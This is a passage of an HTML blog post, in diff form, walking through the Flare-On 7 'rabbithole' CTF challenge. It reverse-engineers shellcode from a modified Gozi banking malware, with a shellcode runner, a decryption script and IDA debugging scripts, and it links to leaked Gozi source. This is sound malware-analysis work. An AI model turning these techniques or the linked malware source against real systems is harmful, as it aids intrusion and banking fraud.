+        <span class="n">du</span><span class="o">.</span><span class="n">display_node</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">call</span><span class="o">.</span><span class="n">node</span><span class="p">,</span> <span class="n">color</span><span class="p">)</span>
+</code></pre></div><p>After running this small script, we can see that calls are now highlighted - makes it impossible to miss them.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_9.png" title="/posts/flare-on-7-rabbithole/images/image_9.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_9.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_9.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_9.png, images/image_9.png 1.5x, /posts/flare-on-7-rabbithole/images/image_9.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_9.png" />
+    </a>
+<h3 id="entering-the-first-stage">Entering the first stage</h3>
+<p>Now that this part is behind us, we are ready to move on and see how does the shellcode load libraries and API functions. In fact, it is rather simple. The shellcode holds a list of relative offsets at its start, and these offsets point to structures it needs in order to work. Some of these structs are names of DLL files (ntdll.dll and kernel32.dll) and names of API functions to load.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_10.png" title="/posts/flare-on-7-rabbithole/images/image_10.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_10.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_10.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_10.png, images/image_10.png 1.5x, /posts/flare-on-7-rabbithole/images/image_10.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_10.png" />
+    </a>
+<p>Then, two loops are iterating through the libraries and API functions and load them using <code>LdrLoadDll</code> and <code>LdrGetProcedureAddress</code>. When done loading and setting up the required API functions, it then parses another value from its table. It reads the value <code>0x3E58</code> from offset <code>0x28</code> and moves it to <code>r10</code>. Then, at <code>0x9D1C</code> the register is being called (it is easier for us to spot this call after executing our helper script).</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_11.png" title="/posts/flare-on-7-rabbithole/images/image_11.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_11.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_11.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_11.png, images/image_11.png 1.5x, /posts/flare-on-7-rabbithole/images/image_11.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_11.png" />
+    </a>
+<p>We can manually navigate to <code>0x3E58</code>, define it as a function and name it <code>first_stage_wrapper</code>. Then, we can go back to <code>call  r10</code>, click on &ldquo;r10&rdquo; and press <code>Alt+F1</code>. Then, in the dialog change &ldquo;r10&rdquo; to <code>first_stage_wrapper</code>.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_12.png" title="/posts/flare-on-7-rabbithole/images/image_12.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_12.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_12.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_12.png, images/image_12.png 1.5x, /posts/flare-on-7-rabbithole/images/image_12.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_12.png" />
+    </a>
+<p>All we have in <code>0x35E8</code> is a small wrapper around another function <code>0x52A8</code>. After a quick look at the function at <code>0x52A8</code> and some of the functions it calls to, it was clear to us that we need to step up our game and move to debug.</p>
+<h3 id="setting-up-a-debug-environment">Setting up a debug environment</h3>
+<p>Debugging the shellcode will allow us to navigate faster through the different functions, inspect memory writes, and analyze the code that we believe to be more relevant to the flow of the function.</p>
+<p>We all know how to debug an executable file, but how should we approach to debugging a shellcode? After all, a shellcode is a position-independent-code and it needs something to call and trigger its execution.</p>
+<p>Well, there are several ways — let&rsquo;s go over some of them quickly:</p>
+<p><strong>Executing the original Powershell Script</strong>
+It may seem like a long time ago, but at the beginning of this challenge, we had a tiny Powershell script that decoded the Base64-encoded shellcode and executed it using APC. As this is the original flow of the attack, it may be wise to execute our shellcode using the original script. One can simply double-click the <code>.ps1</code> file and attach a debugger to the newly created <code>powershell.exe</code>, right? Well&hellip; yes, but it might not be the greatest idea as the program will do a lot of stuff before we will attach the debugger to it, and this might be problematic.</p>
+<p>Can we make the shellcode wait for us before being executed? Yes! To solve this, we can prepend the Base64-decoded shellcode with <code>EB FE</code>. These magical two bytes will cause the shellcode to hang in an infinite loop as the instruction simply jumps to itself infinitely. Then, we will be able to attach a debugger to the shellcode, grab a cup of coffee, relax in our chair, and point the instruction pointer to the real start of the shellcode.</p>
+<p><strong>Use an external shellcode runner program</strong>
+The infosec community is dealing with the &ldquo;how to run a shellcode&rdquo; question for many years. To solve this problem, many had written programs to execute shellcodes. Check <a href="https://github.com/OALabs/BlobRunner" target="_blank" rel="noopener noreffer">BlobRunner</a> for example. These tools will read the shellcode (usually from a file), allocate an executable memory region for it, write it to the newly allocated memory, and execute it.</p>
+<p><strong>Insert the shellcode into an already-compiled memory</strong>
+In this technique we go to the entry point of a binary of our choice, carve out the original code and replace it with our shellcode. This way, when the loader will load the program, it will execute the program from its entry point, which now contains our shellcode. This technique is useful especially with small and self-contained shellcodes that are less prone to problems.</p>
+<p>While these techniques and others will work and allow you to debug the shellcode, they have their issues. One of the most annoying issues, at least in the first two approaches, is that the shellcode will be executed from a dynamically allocated memory space and will rely on our infinite loop. This is especially problematic when we wish to work on a project file (e.g IDA&rsquo;s IDB), rename locations, add comments, and more. The memory for the shellcode will usually be allocated to different addresses, and it will require us to do some nasty tricks and keep our IDB rebased properly. In other cases, when collaborating on the analysis of the shellcode, the addresses will differ between the machines of the different analysts and between every execution.</p>
+<p>To solve this, we can use another technique that will make our life easier. Bookmark this part as you will be able to utilize this technique in many other places as reverse engineers.</p>
+<p>In this approach, we will write a very small C program that will contain two parts. The first is a naive <code>.c</code> file that has a static char array to hold our shellcode and a one-line <code>main</code> function that will call a function that will jump to our shellcode,</p>
+<p><strong>main.c:</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">_sc</span><span class="p">[</span><span class="mi">86016UL</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="p">[...</span> <span class="n">truncated</span> <span class="p">...]</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">WinMain</span> <span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span> <span class="n">LPSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">jump_to_shellcode</span> <span class="p">(</span><span class="n">_sc</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>The second part will be the <code>jump_to_shellcode</code> function. It is a tiny assembly function that reads <code>rcx</code> (first argument) that holds the address of the shellcode array and moves it to <code>rdi</code>. Why <code>rdi</code>? Because our shellcode relies on <code>rdi</code> to hold its start address.</p>
+<p><strong>jump.asm</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.code</span>
+<span class="nf">jump_to_shellcode</span> <span class="no">PROC</span>
+	<span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rcx</span>
+	<span class="nf">jmp</span> <span class="no">rdi</span>
+<span class="nf">my_func</span> <span class="no">ENDP</span>
+<span class="nf">END</span>
+</code></pre></div><p>Then, we used Visual Studio to compile this tiny program, not before we made sure to tell it to not use debug symbols and to ignore all default libraries. This will make sure our code is as small as possible. Then, because the shellcode might rely on the fact that it should have been executed by Powershell, we rename the compiled file to <code>powershell.exe</code>, just in case.</p>
+<p>For your convenience. we attach the compiled binary so you can use it to follow along — Enjoy!</p>
+<ul>
+<li><a href="/posts/flare-on-7-rabbithole/powershell.exe" rel="">powershell.exe</a></li>
+</ul>
+<p>When opening the file in the disassembler, we can see that it looks like this:</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_13.png" title="/posts/flare-on-7-rabbithole/images/image_13.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_13.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_13.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_13.png, images/image_13.png 1.5x, /posts/flare-on-7-rabbithole/images/image_13.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_13.png" />
+    </a>
+<p>The debugging environment we created for ourselves will get rid of annoying allocations and addresses that are constantly changing between executions. In a way, it will feel like debugging a simple executable file.</p>
+<p>From now on we will work with the attached binary file. Hence, the addresses will now change, as the base address of the new shellcode is <code>0x140003000</code>.</p>
+<p>Unlike static analysis, when debugging a program we can avoid going over every single instruction and focus on parts we believe to be important. This is especially true when handling a CTF challenge in which the goal is to quickly achieve the flag.</p>
+<p>We start from where we stopped our static analysis, after the call to <code>r10</code> we arrive at a wrapper function that calls <code>0x1400082A8</code> (offset <code>0x52A8</code> in the shellcode). The function begins with allocating a buffer on the heap and calls a function at <code>0x140004184</code> with a pointer to a buffer on <code>0x140016080</code>. From a quick look, the function seems to iterate over the sections in the shellcode module (not our own <code>powershell.exe</code>) and search for a specific section. Then, it uses the characteristics of this section, as well as the compilation Timestamp (from its header), and generates some kind of a key.</p>
+<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">key</span> <span class="o">=</span> <span class="n">pe</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">TimeDateStamp</span> <span class="o">^</span> <span class="mh">0xB961999E</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">key</span> <span class="p">)</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="o">*</span><span class="n">_sectionVA</span> <span class="o">=</span> <span class="n">sectionFound</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">;</span>
+<span class="o">*</span><span class="n">_sectionSize</span> <span class="o">=</span> <span class="n">sectionFound</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">;</span>
+<span class="o">*</span><span class="n">_key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">^</span> <span class="p">(</span><span class="n">sectionFound</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="o">+</span> <span class="n">sectionFound</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">);</span>
+<span class="k">return</span> <span class="n">success</span><span class="p">;</span>
+</code></pre></div><p>This function results in a 4-bytes key — <code>0xE7019EF0</code>. Then, it calls a function at <code>0x140009EFC</code> that looks interesting.</p>
+<h3 id="xor-decryption-function">XOR decryption function</h3>
+<p>When stepping into this function, that we will call <code>xor_decrypt_data</code>, we can see that the function is allocating a buffer on the heap and copies <code>0xa4</code> bytes from <code>0x140016000</code> to it. The function itself looks like a simple decryption function. For the provided buffer, length, and key the buffer is decrypted to:</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_14.png" title="/posts/flare-on-7-rabbithole/images/image_14.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_14.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_14.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_14.png, images/image_14.png 1.5x, /posts/flare-on-7-rabbithole/images/image_14.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_14.png" />
+    </a>
+<p>Since it is a very simple algorithm, we can implement it in python and see if we get the same results. And indeed, with the following Python script we can decrypt the encrypted buffer:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">malduck</span> <span class="kn">import</span> <span class="n">chunks</span><span class="p">,</span> <span class="n">rol</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
+
+<span class="k">def</span> <span class="nf">xor_decrypt_data</span> <span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">rol_value</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">prev</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">decrypted_buffer</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">dword</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+        <span class="n">temp</span> <span class="o">=</span> <span class="n">prev</span> <span class="o">^</span> <span class="n">u32</span><span class="p">(</span><span class="n">dword</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span>
+        <span class="n">decrypted_buffer</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">rol_value</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>
+        <span class="n">rol_value</span> <span class="o">^=</span> <span class="mi">1</span>
+        <span class="n">prev</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">dword</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">decrypted_buffer</span>
+
+<span class="c1"># The generated key</span>
+<span class="n">key</span> <span class="o">=</span> <span class="mh">0xE7019EF0</span>
+
+<span class="c1"># Address of the encrypted buffer</span>
+<span class="n">ea</span> <span class="o">=</span> <span class="mh">0x140016000</span>
+<span class="c1"># Buffer length</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mh">0xa4</span>
+<span class="c1"># Read the encrypted buffer</span>
+<span class="n">encrypted_buffer</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">xor_decrypt_data</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+
+<span class="c1"># Results:</span>
+<span class="c1"># b&#39;\rF\xfb8\x01\x00\x14\x80\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x000\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x11\x00\x14\x00\x01\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x10\x00\x10\x00\x00\x02\x00L\x00\x03\x00\x00\x00\x00\x00\x14\x00\xff\xff\x1f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x18\x00\xff\xff\x1f\x00\x01\x02\x00\x00\x00\x00\x00\x0f\x03\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\xff\xff\x1f\x00\x01\x02\x00\x00\x00\x00\x00\x0f\x02\x00\x00\x00\x01\x00\x00\x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x00W\x00i\x00n\x00d\x00o\x00w\x00s\x00\x00\x00&#39;</span>
+</code></pre></div><p>Another nice trick we like to do when decryption functions appear in the code is to add a conditional breakpoint that when hit, will print the decrypted buffer to the screen. Then, when we will run the program during our analysis we will be able to see the decrypted buffers in the Output window of IDA. This will give us a nice overview of some of the encrypted data. Let&rsquo;s do this quickly.</p>
+<p>What we want to do is to print the results of the decrypted buffer right after the function is finished. For this, we will also need the length of the buffer, that is being held in <code>rdx</code> right before the decryption function is called. Overall, we will need two conditional breakpoints, one at <code>0x14000E4F4</code> to save the length into a global variable, and another at <code>0x14000E561</code> to print the decrypted buffer.</p>
+<p>Click on the instruction at <code>0x14000E4F4</code> and press <code>F2</code> to define a breakpoint. Then, right-click on the instruction and choose &ldquo;Edit breakpoint&hellip;&rdquo;. In the opened dialog, click on the button with the three dots and paste this Python code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">global</span> <span class="n">string_len</span>
+<span class="c1"># Get length from RDX</span>
+<span class="n">string_len</span> <span class="o">=</span> <span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rdx&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Encrypted string length: {string_len}&#34;</span><span class="p">)</span>
+</code></pre></div><p>Do the same for the instruction at <code>0x14000E561</code> and paste the following Python code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">global</span> <span class="n">string_len</span>
+<span class="c1"># RDI holds the start of the buffer on the heap</span>
+<span class="n">ea</span> <span class="o">=</span> <span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rdi&#34;</span><span class="p">)</span>
+<span class="n">string_bytes</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">string_len</span><span class="p">)</span>
+<span class="c1"># Print the buffer and remove nullbytes just to clean the output</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Decrypted buffer:&#34;</span><span class="p">,</span> <span class="n">string_bytes</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">))</span>
+</code></pre></div><p>Now that we have these conditional breakpoints in place, let&rsquo;s run the program and check the Output window of IDA.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Encrypted string length: <span class="m">164</span>
+Decrypted buffer: b<span class="s1">&#39;\rF\xfb8\x01\x14\x80\x140\x02\x1c\x01\x11\x14\x01\x01\x01\x10\x10\x02L\x03\x14\xff\xff\x1f\x01\x01\x01\x18\xff\xff\x1f\x01\x02\x0f\x03\x01\x18\xff\xff\x1f\x01\x02\x0f\x02\x01Microsoft Windows&#39;</span>
+
+Encrypted string length: <span class="m">4096</span>
+Decrypted buffer: b<span class="s1">&#39;\rF\xfb8\x01\x14\x80\x140\x02\x1c\x01\x11\x14\x01\x01\x01\x10\x10\x02L\x03\x14\xff\xff\x1f\x01\x01\x01\x18\xff\xff\x1f\x01\x02\x0f\x03\x01\x18\xff\xff\x1f\x01\x02\x0f\x02\x01Microsoft WindowsKERNEL32.DLLADVAPI32.DLLNTDLL.DLLKERNELBASEUSER32LdrRegisterDllNotificationResolveDelayLoadsFromDllRtlExitUserThreadSoftwareLdrUnregisterDllNotificationGetWindowThreadProcessId\\REGISTRY\\USER\\%s\\%s\\LdrLoadDll{%08X-%04X-%04X-%04X-%08X%04X}%08X-%04X-%04X-%04X-%08X%04XS-%u-%u-%uLocal\\\\\\.\\pipe\\%05uNtCloseWow64EnableWow64FsRedirectionZwProtectVirtualMemoryLdrGetProcedureAddressWaitNamedPipeWCallNamedPipeWSetThreadInformationNtCreateUserProcess.dll%08xGetShellWindow\\KnownDlls32\\ntdll.dll\\KnownDlls32\\kernelbase.dll%systemroot%\\system32\\c_1252.NLS\\??\\\\\\?\\d\x10\xb7\x1d\xc8 n;\xac0\xd9&amp;\x90A\xdcv\xf4QkkXa\xb2M&lt;q\x05P \x83\xb8\xedD\x93\x0f\xf0\xe8\xa3\xd6\xd6\x8c\xb3a\xcb\xb0\xc2d\x9b\xd4\xd2\xd3\x86x\xe2\n\xa0\x1c\xf2\xbd\xbd&#39;</span>
+</code></pre></div><p>Looks great! Our technique worked and we can now see that there are more calls to the string decryption function. The second time it is called returned with meaningful strings that will likely be used by the malware.</p>
+<p>The binary is then entering what seems like an initialization phase. An initialization function at <code>0x014000DC74</code> is calling another function which is responsible for initializing a struct of size <code>0x1B8</code> with information about the running machine and environment. The structure holds information like the OS version, PID, handles to different modules, the user&rsquo;s SID, paths to HKCU/SOFTWARE (this rings a bell, isn&rsquo;t it?), and more.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_15.png" title="/posts/flare-on-7-rabbithole/images/image_15.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_15.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_15.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_15.png, images/image_15.png 1.5x, /posts/flare-on-7-rabbithole/images/image_15.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_15.png" />
+    </a>
+<p>Then, we can see that the program enters twice to what looks like some kind of a decryption routine. It goes to a data directory and searches if it begins with &ldquo;WD&rdquo;. If it does, it allocates memory for it and calls a function in <code>0x1400066CC</code> to decompress it. The decompression in this function is used by aPLib, as can be seen by the usage of some of its known constants: 32000, 1280, 128.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_16.png" title="/posts/flare-on-7-rabbithole/images/image_16.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_16.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_16.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_16.png, images/image_16.png 1.5x, /posts/flare-on-7-rabbithole/images/image_16.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_16.png" />
+    </a>
+<p>As a result of these executions, a buffer with random words is decompressed and copied to a heap-allocated memory buffer.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">old new current version process thread id identity task disk keyboard monitor class archive drive message link template logic protocol console magic system software word byte timer window scale info char calc map print list section name lib access code guid build warning save load region column row language date day <span class="nb">false</span> <span class="nb">true</span> screen net info web server client search storage icon desktop mode project media spell work security explorer cache theme solution
+</code></pre></div><p>At first look, the list of words looks random, But at a close one, it reminded us of something. And this something was the names of the registry entries we extracted at the beginning of the challenge. Take for example the registry keys <code>RowmapGuiprotocol</code> (row map guid protocol) or <code>TimerscreenClientsecur</code> (timer screen client security), it is clear they were built from words in this dictionary. Interesting, let&rsquo;s keep this in mind.</p>
+<p>With all this data in mind, we couldn&rsquo;t help but wonder whether we are looking at a known malware family, and not just a piece of software that was written by the authors of the challenge. Add to this the fact that the message of the challenge clearly states &ldquo;<em>One of our experts said that &hellip; they took an existing banking malware family, and modified it..</em>.&rdquo; and we were pretty convinced that it is at least worth a try. We went to Google and threw some keywords from our analysis.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_17.png" title="/posts/flare-on-7-rabbithole/images/image_17.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_17.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_17.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_17.png, images/image_17.png 1.5x, /posts/flare-on-7-rabbithole/images/image_17.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_17.png" />
+    </a>
+<p>Win!</p>
+<h3 id="saigon-ursnif-gozi-isfb">Saigon? Ursnif? Gozi? ISFB?</h3>
+<p>The first result leads us to <a href="https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html" target="_blank" rel="noopener noreffer">an article</a> by FireEye (which is also the company behind Flare-On) that describes the Saigon malware, a fork of a popular banking malware named Ursnif, or Gozi or ISFB, or&hellip; well — it is confusing. The evolution of this malware family is thoroughly described in a <a href="https://research.checkpoint.com/2020/gozi-the-malware-with-a-thousand-faces/" target="_blank" rel="noopener noreffer">recent article by Check Point</a>.</p>
+<p>Luckily, the Saigon article, as well as many other articles, describe in detail the different capabilities of these malware. Some of the descriptions aligned with what we&rsquo;ve seen so far. But with all this, maybe the most important part to understand is that the source code of Gozi was leaked and available on multiple GitHub <a href="https://github.com/t3rabyt3-zz/Gozi" target="_blank" rel="noopener noreffer">repositories</a>.</p>
+<p>A look at the source code will reveal to us the entire workflow of the malware, more or less. In fact, one can say that we can shift our focus to a source-code analysis and we will be just fine. For our fun, and for those of you who missed the fact that it is Gozi and that its source is available, we prefer to avoid it and continue our analysis of the binary file. We will refer to the source code or external articles only rarely, to verify assumptions or clear some clouds above complex parts. After all, remember what we mentioned at the very beginning of this article — never walk into the rabbit hole.</p>
+<h3 id="name-generation-using-sid">Name generation using SID</h3>
+<p>The word list we just saw is then processed by the malware and inserted into a struct, along with the user&rsquo;s SID. The struct is then being passed to a function at <code>0x14001021C</code> which is using the XORShift algorithm to generate names based on the user&rsquo;s SID, the word list, and passed arguments. When we executed this function during our debugging session, we got the generated name &ldquo;Loadmagic&rdquo;. This name, naturally, does not appear in the registry key names that we exported, as the original SID of the victim is different than ours.</p>
+<p>The code then continues its initialization process by setting more members in the malware&rsquo;s struct, including the path to the currently running file, and an uppercase version of the filename — &ldquo;POWERSHELL.EXE&rdquo; in our case. Then, it calculates a hash for the uppercase file name and stores it in the struct as well. With this, the initialization routine is over.</p>
+<p>After the initialization, we are entering a function at <code>0x140005E2C</code>. The code is adding a Vectored Exception Handler that will trigger a function at <code>0x140008918</code> (we refer to this function as &ldquo;ExceptionHandler&rdquo;) when exceptions occur in the code. This technique is commonly used by malware as a way to control the flow of the program and to make the analysis and debug harder. Let&rsquo;s put a breakpoint in <code>ExceptionHandler</code>, just in case.</p>
+<pre><code>0x140005EAA lea  rdx, ExceptionHandler
+0x140005EB1 xor  ecx, ecx
+0x140005EB3 call cs:RtlAddVectoredExceptionHandler
+</code></pre><p>The program is then moving to generate 3 registry key names and creates them at <code>HKCU\SOFTWARE\Loadmagic\[generated-key-name]\</code>. After they are created, the program generates another name and appends it to the registry path: <code>HKCU\SOFTWARE\Loadmagic\[generated-key-name]\[key-name]</code>. Then, it tries to read a value from this registry key by using <code>NtQueryValueKey</code>. The API function returns a &ldquo;NAME_NOT_FOUND&rdquo; error.</p>
+<p>The generation of registry key names and trying to read their value, made us think that this could be the point where both parts are connected. In the first part, we had a bunch of registry keys that we dumped from the registry file. And in this part, registry key names are being generated and accessed. At this point, we decided to import to our own registry the registry keys we exported from the initial file, keeping the same names and structures. Then, we want the program to access these keys.</p>
+<p>There is a slight problem, though. Even if we import these registry keys to our very own registry, how can we make the program generate the original key names? Actually, we can. After all, the generated names are generated based on our SID, what if we can retrieve the victim&rsquo;s SID and use it as it was our own? This might work. To do this we need to retrieve the SID of the user.</p>
+<p>We opened the registry file in Registry Explorer once again, this time wandering around and exploring the interface. By clicking on Bookmarks→ Common → Account we get to see the user name of the victim, Kevin! Alright, Kevin, where are you hiding your SID? Thankfully, Registry Explorer makes our life easier and provides us with a &ldquo;Technical details&rdquo; context menu item. This dialog parses the HIVE for us and presents us with very valuable information. The &ldquo;SK record&rdquo; tab (Security Key) contains a list of ACE (Access Control Entry) for the different accounts in the system. The first entry, and the only one which doesn&rsquo;t belong to a built-in user, must be our beloved Kevin. Registry Explorer parses the ACE for us and&hellip; guess what, it even gives us the SID of Kevin — <code>S-1-5-21-3823548243-3100178540-2044283163-1006</code> or <code>01 05 00 00 00 00 00 05 15 00 00 00 53 B7 E6 E3 6C F8 C8 B8 1B 49 D9 79 EE 03 00</code> in bytes.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_18.png" title="/posts/flare-on-7-rabbithole/images/image_18.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_18.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_18.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_18.png, images/image_18.png 1.5x, /posts/flare-on-7-rabbithole/images/image_18.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_18.png" />
+    </a>
+<p>Now that we have Kevin&rsquo;s SID, we can import the registry keys we exported and set conditional breakpoints in our debugger which will change the value of the SID that is used in each part. When the words are generated, we would want Kevin&rsquo;s SID to be used. When the registry is accessed, we would want our own SID to be used — otherwise, the Registry API functions won&rsquo;t find our HKCU.</p>
+<p>First, we want the returned value of <code>NtQueryInformationToken</code> to return Kevin&rsquo;s SID instead of ours. Put a conditional breakpoint at <code>0x140008B99</code> with the following IDA Python code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">print</span><span class="p">(</span><span class="s2">&#34;Set Kevin&#39;s SID&#34;</span><span class="p">)</span>
+<span class="n">kevin_SID</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x53\xB7\xE6\xE3\x6C\xF8\xC8\xB8\x1B\x49\xD9\x79</span><span class="s2">&#34;</span>
